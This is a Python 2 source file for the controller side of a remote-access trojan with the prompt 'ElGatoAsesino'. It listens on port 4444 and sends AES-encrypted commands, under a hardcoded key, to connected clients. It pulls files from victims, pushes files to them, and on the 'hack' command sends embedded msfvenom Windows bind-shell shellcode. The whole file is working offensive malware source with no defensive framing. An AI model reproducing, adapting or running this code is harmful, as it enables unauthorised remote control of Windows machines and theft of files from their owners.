#!/usr/bin/python

import socket
from thread import *
import sys
import pickle
from Crypto.Cipher import AES
import base64



BLOCK_SIZE = 32  # Bytes
unpad = lambda s: s[:-ord(s[len(s) - 1:])]
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * \
                chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.bind(("0.0.0.0", 4444))
except socket.error, v:
    print "Binding failed. Error code : " + str(v[0]) + " Message " + v[1]
    sys.exit()


print "Socket bind complete"

s.listen(10)
print "[+] Listening to the incoming connection on port 4444..."

#def clientthread_sendpublickey(client) :
#    client.send(pickle.dumps(public_key))

def do_decrypt(ciphertext):
    obj2 = AES.new('This_is_a_key123', AES.MODE_ECB)
    message = obj2.decrypt(ciphertext)
    return unpad(message)

def do_encrypt(message):
    #obj = AES.new('This is a key123', AES.MODE_ECB)
    #ciphertext = obj.encrypt(message)
    raw = pad(message)
    obj = AES.new('This_is_a_key123', AES.MODE_ECB)
    ciphertext = obj.encrypt(raw)
    return ciphertext


def clienthandle(client) :
    while True :
        command = raw_input('ElGatoAsesino> ')
        commencrpt = do_encrypt(command)
        client.send(commencrpt)

        if command == 'quit' :
            break
        elif 'download' in command:
            a = command.replace("download","")
            a = a.replace(" ", "")
            with open("copy"+a, 'wb') as f:
                buf = client.recv(35000)
                buf = do_decrypt(buf)
                f.write(buf)
        elif 'upload' in command:
            a = command.replace("upload","")
            a = a.replace(" ", "")
            with open(a, 'rb') as f:
                buf = f.read(350000)
                buf = do_encrypt(buf)
                client.send(buf)
        elif "hack" in command:
            # msfvenom -p windows/shell/bind_tcp -e none
            shellcode ="\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52" + \
                "\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26" + \
                "\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d"+ \
                "\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0"+ \
                "\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b"+ \
                "\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff"+ \
                "\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d"+ \
                "\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b"+ \
                "\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44"+ \
                "\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b"+ \
                "\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f"+ \
                "\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29"+ \
                "\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50"+ \
                "\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x31\xdb"+ \
                "\x53\x68\x02\x00\x11\x5c\x89\xe6\x6a\x10\x56\x57\x68\xc2"+ \
                "\xdb\x37\x67\xff\xd5\x53\x57\x68\xb7\xe9\x38\xff\xff\xd5"+ \
                "\x53\x53\x57\x68\x74\xec\x3b\xe1\xff\xd5\x57\x97\x68\x75"+ \
                "\x6e\x4d\x61\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9"+ \
                "\xc8\x5f\xff\xd5\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56"+ \
                "\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56"+ \
                "\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x85"+ \
                "\xf6\x75\xec\xc3"
            shellcode = do_encrypt(shellcode)
            client.send(shellcode)

        else:
            buf = client.recv(10000)
            encreply =buf
            print do_decrypt(encreply)

while True:
    (client, (ip, port)) = s.accept()
    print "Received connection from : ", ip
    start_new_thread(clienthandle, (client,))
